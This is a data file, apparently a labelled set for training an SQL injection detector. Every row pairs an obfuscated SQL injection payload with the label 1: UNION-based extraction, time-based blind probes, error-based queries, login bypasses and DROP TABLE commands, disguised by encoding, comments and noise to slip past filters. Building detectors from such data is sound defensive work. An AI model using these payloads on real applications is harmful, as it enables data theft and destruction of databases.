"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--%23losjoowp3402gxv", 1
"1'UNIONSELECTtable_name,/*%0d%0a*/null,/*%0d%0a*/null%0d%0aFROMinformation_schema.tables--", 1
"1%27OR%2F%2A%250d%250a%2A%2FIF%28substring%28database%28%29%2C1%2C1%29%3D%27a%27%2CSLEEP%285%29%2C0%29%250a--%250a", 1
"'OR/*%0d%0a*/EXISTS(SELECT1FROM/*%0a*/users)--", 1
"--s8oqmfw", 1
"1%27%20Or%20asCII(SUbstRiNG(DAtaBaSE(),%201,%201))%20%3E%20100%20--", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29 /*!*/AND 1=1--", 1
"%2527%25%25320OR%2520EXISTS%28SE%254cECT%25201%2520FR%254f%254d%2520use%2572s%29--", 1
"%27%20%41N%44%201%3D1%20-%2d%20#7%69lyr4tzm4x4osa", 1
"a%64m%69n'O/**/R%0%61'1'='1%0d%0a", 1
"1)%09%09UniON%09%09SelEct%09%091,dataBaSe(),3--", 1
"'%20OR EXISTS%28S%45LECT 1 FROM u%73ers)--", 1
"'OR'1'='1/*%0d%0a*/#more_noise--jrt51", 1
";/**/DRoP/**/tabLe/**/useRS;/**/--", 1
"' OR 1=1  # more_noise--", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--#5436wfq", 1
"1%27ori%2546%2528SUBs%2574%2572Ing%28da%2574AbaSe%28%29%2C1%2C%0A1%29%3D%27a%27%2CslEeP%25285%29%2C0%29--", 1
"1'/*!12345*/UNIon/**/sELect/**/tAble_nAmE,/**/NuLl,/**/nUll/**/fROm/**/iNFoRMAtioN_SCheMA.tabLeS/**//**/#/**/More_NOise--", 1
"%27%20XOR%20extractvalue(1,concat(0x5c,version()))--", 1
"test'/%2a%2a/%4fR '1'%09= '1' /* /*%21*/AND 1=1", 1
";/*!*/sEleCt Pg_SleeP(5); --", 1
"test%27%20O/**/R%20%271%27IN%20%281%29%271%27%20%2F%2A", 1
"%31))/**/UNI%4fN SELECT%201,d%61tabase(%29,3 OR (1)--", 1
"%27%20anD%201%3DcONVeRT(iNt,@@VersiON)--", 1
";/*!*/DROP TABLE users; --", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020%u0020/*!*/AND%u00201=1--%u0020#jbqrwkjn1wrgz", 1
"test%27					OR					%271%27%20%3D%09%271%27					/*", 1
"%25u0027%25u0020Or%25U0020%25u00271%25U0027%3d%25U00271", 1
"'AND/*%0a*/1=1--", 1
"%u0027%u0020uNIOn%u0020sELecT%U0020nulL,%U0020nuLL,%U0020NUll%u0020--%u0020", 1
"%61dmin'%20OR/*!*/'1'IN/**/(1)'1", 1
"'%20aND ExtrACtVA%6CUE(1,CoNCaT(0x5%63,V%65RSiOn())) -- RaN%64OM_No%69%73e--", 1
"' UNION SEL%45CT 1,2,3%2d-#3x%76wi", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29----n2oks2n5wki2", 1
"%27%20Or%20eXiSTS%28seLecT%201%20From%20USErs%29--", 1
"%2527%2520OR%2520EXISTS%28SELECT%25201%2520FROM%2520users%29--", 1
"'/*!*/OR '1'='1--2xqx7i0r7ftg", 1
"1)/**//**/UNion/**//**/sElecT/**//**/1,DatABASe(),3--", 1
"'OR%0d%0aEXISTS(SELECT1FROM%0ausers)--", 1
"#dyuoxkwjzihi2th", 1
"'/**/AND/**/1=1/**//**//*!*/AND/**/1=1--/**/", 1
"' || 1=1  && (1=1)'a'='a'--", 1
"%27%20oR%201%3d1%20--%20", 1
"TESt%U0027%u0020O/*!12345*/r%U0020%U00271%u0027=%U00271%u0027%U0020/*", 1
"%u0027/**/aNd%u00201=conVErt(Int,@@VErSIOn)--", 1
"'/**//**/unioN/**//**/SelEcT/**//**/nuLL,/**//**/nUlL,/**//**/NULL/**//**/--/**//**/", 1
";/**/DROP	TABLE	users;	--", 1
"%u0027%u0020OR%u0020%31=1%u0020%2d-%u0020--v3vcbeoqd4", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**//**/AND/**/'a'='a'--", 1
"1))UniOnsELecT%0A1,DAtABASE(),3 And 'a'='A'--%0D%0A#4a7apOg", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20%20%23%20more_noise--", 1
"1'UNIONSELECTtable_name,null,/*%0d%0a*/nullFROMinformation_schema.tables -- random_noise--", 1
"'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**//**/OR/**/'b'LIKE'b'--/**/", 1
"1))/**/UNION/**%2f%53ELECT/**/1,d%61%74abase%28),3--", 1
"1%u0020AND%u00201%20= 1", 1
"'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/ AND 'a'='a'--/**/", 1
"'/**/UNIONSELECT", 1
"null,%0d%0anull,null OR 'b'='b'--/*%0d%0a*/", 1
"%27AND%20ex%74ract%76alue(1,con%63at(0x5c,version()))%2d-/*%0d%0a*/", 1
"1'AND%73u%62string(da%74ab%61se%28),1,%0a1)='s'--/*%0d%0a*/--lkcisqguulr", 1
"%27%20%41ND%201%3D1%20--%20", 1
";				drOp				tAbLE				USErs;								Or				'b'	>= 'B'--", 1
"1))/*!*/%55NiOn seleCT%201,%64%61tabAse(),3--", 1
";					drop					tAbLe					Users;					----ozpg4uxsz29wk", 1
"1'    OR    IF(substring(database(),    1,    1) =  'a',    SLEEP(5),    0)    --", 1
"1)) unI%6f%6e seleCT %31,d%41TaBasE(),3--", 1
"1%27/*!12345*/OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--#08owxeqsg98", 1
"%u0027%u0020AND%u00201IN (1)1%u0020 -- random_noise--%u0020", 1
"%27%20AND%2520%2531%253dc%256fnvert%28int%2C%40%40version%29--", 1
"%3B%20DROP%2%30TABLE%%320users%3%42%20--", 1
"'/**/OR ExIsTs(sELEcT 1 From UsERs)--", 1
"1'/**//**/||/**//**/IF(substring(database(),/**//**/1,/**//**/1)%20=/**//**/'a',/**//**/SLEEP(5),/**//**/0)/**//**/--", 1
"te%53t'OR%271'='1'/*/%2a%0A*/#3vQT2%65cpRg", 1
"%31'/*!1%32345*/OR%20IF(substring(databas%65(), 1, 1)='a'%2c SLEEP(5), 0) %2d%2d", 1
"%27%20UN/**/ION%20SELECT%201%2C2%2C3--", 1
";/**/DR%4f%50/**/T%41BLE/**/u%73ers;/**/--", 1
"1/**/AND/**/1=1/**/#/**/more_noise", 1
"1%2527%2520UNION%2520SELECT%2520table_name%2C%2520null%2C%2520null%2520FROM%2520information_schema.tables%2520--", 1
"%u0027%u0020%u0020%u0020AND%u0020%u0020%u00201%09=%20convert(int,@@version)--", 1
"'/**/AN%44%20extractvalue(%31,conca%74(0x5c,version()))%2d-", 1
"W%41ITFOR%20DELAY%20%270%3A0%%33A5%27%2d-", 1
"%2527%2520XOR%25201LIKEconvert%28int%2C%40%40version%29--", 1
"test'/**/O/*!*/R/**/'1'='1'/**//*/**/#/**/more_noise", 1
"'/**/AND1IN%0d%0a(1)convert(int,@@version)/*!*/AND1=1--", 1
"' AND 1LIK%451%20--", 1
";%20%20SELECT%20%20pg_sleep(5);%20%20--", 1
"1'%09%09%09%09%09A/*!*/ND%09%09%09%09%09substring(database(),%09%09%09%09%091,%09%09%09%09%091)%09%09%09%09%09/**/=%09%09%09%09%09%09's'%09%09%09%09%09--", 1
"%27%20XOR%20extractvalue(1,concat(0x5c,version()))----prekuusf3ulsdfy", 1
"%u0027AND", 1
"1IN%u0020(1)1%0a AND 'a'='a'--/*%0d%0a*/", 1
"%u0027%u0020AND%u00201=1%u0020/*!*/OR 'b'='b'--%u0020", 1
"1))UNIONSELECT1,database(),3--", 1
"#c57zx1ec3f", 1
"'      OR      1  =  1       -- random_noise--", 1
"1%27/**/OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20%20AND%20%27a%27%3D%27a%27----17mhek2", 1
"1%27%20A/*!12345*/ND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"'AND/*%0d%0a*/1=1%0d%0a OR (1)--", 1
"1)%%309%09UNI%4fN%09%%309SEL/**/ECT%09%0%391,d%61tabase(),3--", 1
"test'%09%09OR%09%09'1'	= '1'%09%09/*--6t1kon", 1
"a%64min' XOR '1'%3d'1", 1
"%27%20||%201%3D1%20--%20", 1
"AdMiN'/*!12345*/or '1'>='1", 1
"1%u0020AND%u00201=1--g2nb8", 1
"%27%20UNION%20SELECT%201%2C2%2C3%20AND%20%27a%27%3D%27a%27--", 1
"1)%20unIOn%20seLEcT%201,DaTAbase(),3--", 1
"admin'||%0d%0a'1'=%20'1", 1
"", 1
"te%73t%27%20O%52%20%20'1'%20=  '1'%20%20/*#f5rszt0mh4", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271#xggu3ug97xourw", 1
"%u0027%u0020AND%u0020extractvalue(1,concat(0x5c,version())) # more_noise--#ei1wvd3xkzb", 1
"%2574EsT%27%20Or%20%271%27%253d%271%27%20%2F%2A%20OR%20%281%29", 1
"%u0027UNION/*%0a*/SELECT1,2,3%u0020#%u0020more_noise--", 1
"1%25u0027%25u0020UNION%25u0020SELECT%25u0020table_name%2C%25u0020null%2C%25u0020null%25u0020FROM%25u0020information_schema.tables%25u0020--", 1
"'%20%20%20%20%20OR%20%20%20%20%201/*!12345*/ =  1%20%20%20%20%20--%20%20%20%20%20#zen68983mj", 1
"%25u0027AND%250a1%3Dconvert%28int%2C%40%40version%29--", 1
"1%u0027			OR			ascii(substring(database(),			1,			1))			>			100			----dgmndy37jlydn", 1
"1'				AnD				subsTriNG(daTABase(),				1,				1)					=%20				'S'				--", 1
"tESt' or '1'iN (1)'1' --", 1
"1%25u0020AND%25u00201%3D1", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20----6kenab0obs", 1
"%27%20UNION%20%53EL%45CT%201,2,%33--", 1
"1' AND substring(database(), 1, 1) = 's'  OR (1)--", 1
"'AND%0a1=1--/*%0a*//*%0a*/", 1
"%27/*!*/OR%20%271%27%20%3D	%271#fzsuy8v1htoxn77", 1
"%27%20AND%201%2520%3D%2509convert%28int%2C%40%40version%29--", 1
"test'          OR          '1' =	'1'          --", 1
"test'OR%0d%0a'1'LIKE'1'--%0d%0a", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29#more_noise--/*%0d%0a*/", 1
"WAITF%4fR%20%20%20%20DELAY%20%20%20%20%u0027%30:0:5%u0027-%2d", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)%3D%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020%20OR%20%27b%27%3D%27b%27--", 1
";%U0020Drop%U0020table%U0020Users;%u0020--#DaWda6LC6", 1
"1'%09%09%09%09%09OR%09%09%09%09%09aSCII(SubSTRING(dAtaBASE(),%09%09%09%09%091,%09%09%09%09%091))%09%09%09%09%09>%09%09%09%09%09100%09%09%09%09%09--", 1
"test'/**/OR/**/'1'>='1'/**//*", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--#6wy8z55ufxlzu", 1
"' xOR 1=CON%76ERT(%49%4et,@@%56eRSion)--", 1
"1'ANDsubstring(database(),1,1)=", 1
"'s'", 1
"--", 1
"1 && (1=1)1=1", 1
"test' OR '1'='1'  OR 'b'='b'-- --p7jqz8gwh", 1
"test%27%u0020O%52%u0020%u0027%31%u0027=%u00271%u0027%u0020%u0020o%72%u0020%u0027B%u0027=%u0027b%u0027--%u0020", 1
"test%27%20OR%20%271%27%3D%271%27%20--%20#ajtos8c7z64za", 1
"teST%27%20or%20%271%27%3D%271%27%20--%20", 1
"%3b%20dROp%20tAbLe%20useRs%3b%20--", 1
"' UNION SELE%43T null, null,%20%6eull --%20", 1
"tEsT%27%20or%20%271%27%3D%271%27%20--%20", 1
"1))%20UNION%20SELECT%201,database(),3%20OR%20%27b%27%3D%27b%27----qn4l5ou9ifh", 1
"%27UNIONSELECT/*%0a*/1,2,3--", 1
"admin%27%20OR%20%271%27%3D%271%u0020#%u0020more_noise", 1
"%3B%20DROP%20tABle%20useRs%3B%20--", 1
"1 AND 1>=1 OR 'b'='b'--gofu0pd69wu7egm", 1
"1)) UnioN selEct 1,dAtABase(),3--#k3me9u", 1
"1) uNIon selECT 1,dAtaBAsE(),3--", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20%20OR%20(1)--%20", 1
"admin'OR%0d%0a'1'='1", 1
"test'OR/*%0a*/'1'>='1'%0d%0a--/*%0d%0a*/", 1
"1'UNION", 1
"SELECTtable_name,null,nullFROMinformation_schema.tables--", 1
"%27%20XOR%20EXISTS%28SELECT%201%20FROM%20users%29--", 1
"1'OR/*%0d%0a*/IF(substring(database(),1,1)LIKE'a',/*%0a*/SLEEP(5),0)--", 1
"1%u0027/**/OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--", 1
"1%27/*!12345*/OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20%20OR%20%27b%27%3D%27b%27--", 1
"WAITFOR%20DELAY '0:0:5%27%2d-", 1
"%u0027%u0020AND%u0020extractvalue(1,concat(0x5c,version())) OR (1)--", 1
"'%20%41ND extr%61ctvalue(%31,%63oncat(0x5c,version()))--", 1
"test'%20%20%20O/*!12345*/R%20%20%20'1'/**/=/**/'1'%20%20%20--%20%20%20", 1
"%27%2F%2A%2A%2FUNION%20SELECT%20null%2C%20null%2C%20null%20--%20%23zu4s1tyc0zr5a", 1
"'UNioNSElect/*%0D%0a*/1,2,3%0d%0a--raNdoM_NOise--", 1
"%25u0027%25u0020or%25u00201%3D1%25u0020%25u0020OR%25u0020%281%29--%25u0020", 1
"; Drop taBle uSErS; --", 1
"' anD ExtRaCTVaLUE(1,cONCat(0x5C,VeRsioN())) AND 'a'='a'--", 1
"1/**/aNd 1=1", 1
"tEsT'/*!12345*/Or '1'='1' /*", 1
"' AND 1<=convert(int,@@version)--", 1
"'UNION", 1
"SELECTnull,%0anull,%0anull--", 1
"1)/*!*/UNION SELECT 1,database(),3--", 1
";%44ROPTABLE/*%0a*/u%73ers;/*%0a*/-%2d/*!*/AND/*%0d%0a*/1=1", 1
"1))/*!12345*/UNION		SELECT		1,database(),3--", 1
"admin'%4f%52%0a'1'='1/%2a%0a*/", 1
"' aNd 1IN (1)1  -- random_noise--", 1
"'/*!*/AND/**/1=convert(int,@@version)--", 1
";/**/SELECT%20pg_sleep(5);%20--", 1
"WAITFOR/**/DELAY/**/'0:0:5'/**/#/**/more_noise--", 1
"%27%2F%2A%2A%2FUNION%20SELECT%201%2C2%2C3--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#720x1xmops2w7e", 1
"1) uNioN sElecT 1,daTabAse(),3 OR (1)--", 1
"1'		%4fR		ascii(substring(da%74abase(),		1,		1%29%29		>		%3100		--", 1
"'/**/XOR/**/'1'='1", 1
"%27%2F%2A%2A%2FAND%2F%2A%2A%2F1%3Dconvert%28int%2C%40%40version%29--", 1
"1%2F%2A%2112345%2A%2FA%254eD%201%3D1", 1
"%27%20%20%20%20%20%20%20%20%20%20OR%20%20%20%20%20%20%20%20%20%201%09%3D%091%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20--%20%20%20%20%20%20%20%20%20%20random_noise--%20%20%20%20%20%20%20%20%20%20--q5hbton", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29----856nig", 1
"1 AND 1=1 OR 'b'='b'#4acz8kkzdo311t", 1
"test%27%2F%2A%2112345%2A%2FOR%20%271%27%3D%271%27%20 -- random_noise--%20", 1
"test'/**/OR/**/'1'IN (1)'1'/**//*--zd126uo", 1
"%27%20AND%20%31%3D1%20--%20", 1
"%27%20Or%20%271%27%3D%27%31 OR 'b'='b'", 1
"TEST'%20%20%20%20%20oR%20%20%20%20%20'1'	=%20'1'%20%20%20%20%20%20%20%20%20%20/*!*/AND%20%20%20%20%201	=%201--%20%20%20%20%20", 1
"'/*!12345*/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)--", 1
"1'ORascii(substring(database(),", 1
"1,1))>100/*!12345*/OR (1)--", 1
"' anD 1=CONvErT(int,@@vERSIoN)--", 1
"TeSt%27oR%0A%271%27iN%20%281%29%271%27%2F%2A%250D%250A", 1
"%27%20AND%201%3D1%20--%20#jvt3kt3wdzkjr", 1
"1%27%20or%20AsCiI(suBstRINg(dAtaBaSE(),%201,%201))%20%3E%20100%20--", 1
"1'%20UNION/**/S%45LECT/**/table%5f%6eame,/**/null,/**/null/**/%46ROM/**/informa%74ion%5fsch%65ma.tables/**/--", 1
"TesT%2527%2520or%2520%25271%2527%253d%25271%2527%2520--%2520", 1
"admin'/*!12345*/OR'1'<='1#scpff3a%0a", 1
"1'					OR					ascii(substring(database(),					1,					1))					>					100					 AND 'a'>='a'--", 1
"'/**/OR%2f**/EXISTS(%53ELEC%54/**/1/%2a%2a/FROM/**/users)--", 1
"%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2F -- random_noise--%2F%2A%2A%2F", 1
"1)%u0020UNI%4fN%u0020SELECT%u00201,da%74%61base%28),3--", 1
"'/**/OR/**/1%09=%091/**/--/**/", 1
";%U0020DROp%U0020tABlE%U0020uSerS;%U0020--", 1
"1%27%20And%20SUBstRInG(DatabASe(),%201,%201)%20%3D%20%27s%27%20--", 1
"%3B%25u0020DROP%25u0020TABLE%25u0020users%3B%25u0020--", 1
"1'/**/Union/**/sElECt/**/TaBLe_naME,/**/nuLL,/**/NuLL/**/fRom/**/iNforMAtIon_scheMA.TaBLEs/**/--#Xw8jI093MKtN", 1
"' %41ND 1LIKE1%20--", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users) /*!*/AND 1=1--", 1
"1)UNION/*%0d%0a*/SELECT1,database(),3--", 1
";/*!*/DROPTABLE/*%0a*/users;--#gw4zrm3434q8xk", 1
"1%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020AND%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u00201%u0020=%u0020%u00201", 1
"1))UNION/*%0d%0a*/SELECT1,database(),3----gs0zj3dihz3t36h", 1
"test%27%20%7C%7C%20%281%3D1%29%271%27%3D%271%27%20%20%2F%2A%21%2A%2FAND%201%3D1--%20%23jpyoqz1cr", 1
"1)/**/UN/*!*/ION/**/SELECT/**/1,database(),3--#d805s0hd67fxdea", 1
"1%u0027%u0020aNd%u0020sUbstRInG(dataBASe(),%u00201,%u00201)%u0020<=%u0020%u0027s%u0027%u0020--", 1
"WAITFOR DELAY '0:0:5' # more_noise--", 1
"1' UNION SELECT tabl%65_%6e%61me, nul%6c, null FROM info%72ma%74ion_sche%6d%61.tables --#6tx01e", 1
"1'/**/or/**/aScii(sUbStRing(daTabAse(),/**/1,/**/1))/**/>/**/100/**/ OR (1)----Tt7fBury7J5QPb", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----p23zb2", 1
"1%27UNIONSELECTtable_name%2Cnull%2CnullFROMinformation_schema.tables OR (1)--%2F%2A%250a%2A%2F", 1
"1))%u0020UNiOn%u0020sElECt%u00201,daTabase(),3--#ngqtr", 1
"test%u0027%u0020O/*!12345*/R%u0020%u00271%u0027=%u00271%u0027%u0020/*--sadg2ni1z", 1
"test%27%20%7C%7C%20%281%3D1%29%271%27%3D%271%27%20--%20", 1
"test'%09%09%09%09OR%09%09%09%09'1'	=/**//**/'1'%09%09%09%09/*", 1
"TesT%%75%30027%u0020OR%u002%30%u00271%%750027=%u00271%u0027%u0020-%2d%u002%30", 1
"%27and1%3D1%0d%0a--", 1
"1 and 1<=1#8E7abghwJzyg09M", 1
"' oR%201=1 -%2D", 1
"1%20a/**/nD%201%3d1", 1
"1/**/AND/**/1IN (1)1", 1
"'					&&					extractvalue(1,concat(0x5c,version()))--", 1
"1))UNION", 1
"SELECT/*%0a*/1,database(),3--%0d%0a", 1
"admin%2527%20O%2552%20%271%27%3D%271", 1
"1)/*!12345*/UNION   SELECT   1,database(),3--", 1
"1%27%2F%2A%2A%2FUN/*!12345*/ION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F--", 1
"WaITFOR DeLAy '0:0:5'--", 1
"'          OR          EXISTS(SELECT          1          FROM          users)--", 1
";%20dRo%50 TaBlE UsE%72S; ----U11CW3r", 1
"' UNION SELECT %6eull%2c %6eul%6c, null --", 1
"%27			OR			%271%27%09%3D%20%271%20AND%20%27a%27%3D%27a%27", 1
"1)%20UN%49ON%2%30S%45LECT%201,data%62ase(),3--", 1
"%U0027%u0020oR%u00201%3d1%u0020--%U0020", 1
"admin'/*%2a/OR%2f**/'1'%3d'1", 1
"admin'/**/OR/**/'1'	=%09'1", 1
"1) unIoN SelEcT 1,DATaBAsE(),3--", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020----rux9kq", 1
"1%u0020AND%u00201=1%u0020/*!*/AND%u00201=1", 1
"1%u0027/**/UNION/*%2a/SELECT/**/table_na%6de%2c/**/null,/%2a*/nu%6cl/**/FROM/**/i%6eformation_sc%68e%6da%2etab%6ces/**/%u0020AND%u0020%u0027a%u0027=%u0027%61%u0027--", 1
"' UNION SELECT 1,2,3--#n1dzywczad43e", 1
"1'%2%30%41ND%20substring(database(),%2%30%31,%20%31)%20  >= %20'%73'%20--", 1
"' AND 1<=1 --", 1
"1'        ||        ascii(substring(database(),        1,        1))        >        100        ----zawe0mr0kginj", 1
"'AN%44/*%0D%0A*/eX%74rACt%76a%6cUE(1,CONCAt(0x5C,veRsioN())%29----Ytu3eg8U3", 1
"", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020%u0020/*!*/AND%u00201=1--%u0020", 1
"; DROP TABLE users;  -- random_noise--", 1
"test'/*!*/||%20%281=1)'1'='1' %2f*", 1
"%31%41nd", 1
"1=1%0D%0A # more_noise", 1
"1)          UNION          SELECT          1,database(),3--", 1
"1)) U%4eION S%45L%45CT 1,database(),3-%2d -- random_noise", 1
"1'/**/aND/**/subsTRINg(DATAbaSE(),/**/1,/**/1)/**/=/**/'S'/**/--", 1
"' OR EXISTS(SELECT 1 FROM users) /*!*/AND 1=1--", 1
"tEST%27%20or%2520%271%27%3D%271%2527%20%2F%2A", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#tot1ff4", 1
"%27%20%7C%7C%20%281IN%20%281%291%291%3D1%20--%20", 1
"1))UNION/*%0a*/SELECT/*%0d%0a*/1,database(),3--/*%0d%0a*/", 1
"%27%20UNION%20SELEC%2554%20%256eull%2C%20nu%256cl%2C%20null%20--%2520", 1
"%25u0027%25u0020OR%25u0020EXISTS%28SEL%2F%2A%21%2A%2FECT%25u00201%25u0020FROM%25u0020users%29--#3kxcvuq15by0", 1
"1'					OR					IF(substring(database(),					1,					1)%09=  'a',					SLEEP(5),					0)					--", 1
"1%2527%2F%2A%2112345%2A%2FOR%2520IF%28substring%28database%28%29%2C%25201%2C%25201%29%253D%2527a%2527%2C%2520SLEEP%285%29%2C%25200%29%2520--", 1
"%27%20%4fR%201%3D1%%320--%20--pdok7nplymzmm", 1
"%27/**/AND/**/1=%63onvert(in%74,%40@version)--", 1
"1/**/AND/**/1IN/*!12345*/(1)1 AND 'a'='a'", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20 OR 'b'>='b'--", 1
"%31))%u0020%55NION%u0020SELECT%u00201,datab%61se(),3%u0020OR%u%30020%u0027b%u%30027%3d%u0027b%%750027-%2d--dz73sv%731%35auro", 1
"admin%u0027/**/||%u0020(1=1)%u00271%u0027=%u00271%u0020#%u0020more_noise", 1
"admin'/**/OR/**/'1' =	'1--mxhmjy", 1
"%27OREXISTS(SELECT/*%0a*/1FROMusers)--/*%0a*/", 1
"'					UNION					SELECT					null,					null,					null					--", 1
"admin'        OR        '1'%09=	'1", 1
"%27%2%30UNION%20SELECT%20n%75l%6c,%20null%2c%%320null%20--%20", 1
"%u0027%u0020OR%u0020%u00271%u0027>=%u00271", 1
"1'        OR        IF(substring(database(),        1,        1)	=%09'a',        SLEEP(5),        0)        --", 1
"1/**/AND/**/1>=1#gi1ez", 1
"'/**/oR eXiSts(sElECt 1 FroM Users)--", 1
"'/*!*/OR '1'='1--8ywnt", 1
"1'UNIONSELECT", 1
"table_name,null,nullFROM%0d%0ainformation_schema.tables--", 1
"", 1
"%27/**/AND%2f**/1%20=  %63onvert(int,%40@versi%6fn)--", 1
"test%u0027%u0020O/*%21*/%52%u0020%u00271%u0%3027%3d%%750%30271%u0027%u0020/* AND 'a'='a'", 1
"1%20AND%201%3D1--s303kahqr9sj9q", 1
"1    && (1IN (1)1)   1 = 1#jb45mn0the8ah9i", 1
"'UNION", 1
"SELECT%0d%0a1,2,3--%0d%0a", 1
";     DROP     TABLE     users;          OR     (1)--", 1
"1' A%4eD substring(database(),%20%31%2c 1)%20= 's' --", 1
"WAI%54%46%4f%52%20DELAY%2%30%270:0:5%27--#z3njjag59dxxci1", 1
"aDmiN'/**/Or/**/'1'='1", 1
"%61dmin%27%20OR%20%271%27%3D%271", 1
"1%29%20UN/*!12345*/ION%20SELECT%201%2Cdatabase%28%29%2C3--#9ea84ugll", 1
"test'/**/O/*!*/R/**/'1'='1'/**/--/**/", 1
"'    || (1=1)   EXISTS(SELECT    1    FROM    users) -- random_noise--#k9yvkq2w", 1
"t%65st%27%20OR%20%%327%31%27%3D%271%27%20/*", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users) OR 'b'='b'--#rek50", 1
"'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/--of9ye7r0vi", 1
"WAITFOR/*!12345*/DELAY '0:0:5' && 'a'='a'--", 1
"tes%74%u0027OR", 1
"%u00271%u0027LIKE%u00271%u0027%20/*/*%0d%0a*/", 1
"1%25u0027%25u0020A%2F%2A%2A%2FND%25u0020substring%28database%28%29%2C%25u00201%2C%25u00201%29%25u0020%253D%25u0020%25u0027s%25u0027%25u0020--", 1
"1'%20%20UNION%20%20SELECT%20%20table_name,%20%20null,%20%20null%20%20FROM%20%20information_schema.tables%20%20--", 1
"1'/**/A%4eD%20su%62string%28databa%73e%28),/**/1,/**/1)/**/=/**/'s'/**/--#o34vdq0mr8r4", 1
"%25u0027%25u0020AND%25u00201%253Dconvert%28int%2C%40%40version%29--", 1
"1AND%250a1%3D1", 1
"test%27%20%20%20%20OR%20%20%20%20%271%27%09%3D%2509%271%27%20%20%20%20%20%23%20more_noise--%20%20%20%20--y3ou8h2thiohq", 1
"test%u0027/**/OR%u0020%u00271%u0027=%u00271%u0027%u0020%u0020/*!*/AND%u00201=1--%u0020--cbjp41ms1l6", 1
"%u0027%u0020OR%u0020%u00271%u0027 =%09%u00271--m14r75mz2v", 1
"1%27%20UN/**/ION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20--", 1
"test%%327%20OR%2%30%271%%327%3D%271%27%20--%%320", 1
";DROP/*%0a*/TABLE%0d%0ausers;%0a--", 1
"1' anD SUbsTriNg(dAtabaSE(), 1, 1) = 'S' --", 1
"' AND 1=%31 %2d-", 1
"WAITFOR/*!*/   DELAY    '0:0:5'--", 1
"'un%69oNsElEcT/*%0d%0%61*/%31,2,3--/*%0d%0a*%2f", 1
"'%55NiO%4E%0a%53EleCt1,2,3--", 1
"test' OR '1'IN (1)'1' /*", 1
"'/*!12345*%2fO%72 '%31'='1 # more_noise", 1
"%27%20||%20(1%3D1)1%3D1%20--%20--n5or4huh1v4a", 1
"' aNd 1=cONVerT(Int,@@VERSion)--", 1
"test'/**/Xor '1'='1' /*", 1
"%3B%25u0020DROP%25u0020TABLE%25u0020users%3B%25u0020 AND 'a'='a'--", 1
"%57AITF%4fR/*!*/DELAY '0:%30:5'--#0gi3xmogl53", 1
";SeLeCtPG_Sleep(5);%0d%0a--%0d%0a", 1
"1'/*!12345*/OR if(suBStRInG(dAtAbASE(), 1, 1)='A', sleEP(5), 0) --", 1
"%27%20A%254e%2544%20extr%2561ctvalue%281%2Cconcat%28%2530x5c%2Cversion%28%29%29%29%2520--%20random%255fnoise%252d-", 1
"'AND/*%0a*/1LIKEconvert(int,@@version)--/*%0d%0a*/", 1
"WAITFOR/**/DELAY%20%270:0:5%27--", 1
"1 AND 1=1 --%20random_no%69%73e", 1
"'/**/A/*!*/ND/**/extractvalue(1,concat(0x5c,version()))--", 1
"'			UNION			SELECT			null,			null,			null			--			--43a302t3", 1
"test%u0027%u0020OR%u0020%u00271%u0027	%3D%20%u00271%u0027%u0020/*", 1
"1%29%u00%320UNI%4fN%u%30020SEL%45CT%u00201,database(),3--", 1
"admin' OR '1'='1#1oh0dxwg4o", 1
"' OR E%58ISTS%28SE%4cECT 1 FROM use%72s)--", 1
"' OR EXIS%54S(SELEC%54 1 FROM us%65r%73)--", 1
"1' O%52 IF(substring(databa%73%65(%29, 1, 1)='a', SLEEP(5), 0)%20 AND%20'%61'='a'----duj%65tr", 1
"1'/*!*/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--", 1
"%27%20OR/**/'1'LIKE'1", 1
"1'    UNION    SELECT    table_name,    null,    null    FROM    information_schema.tables    --", 1
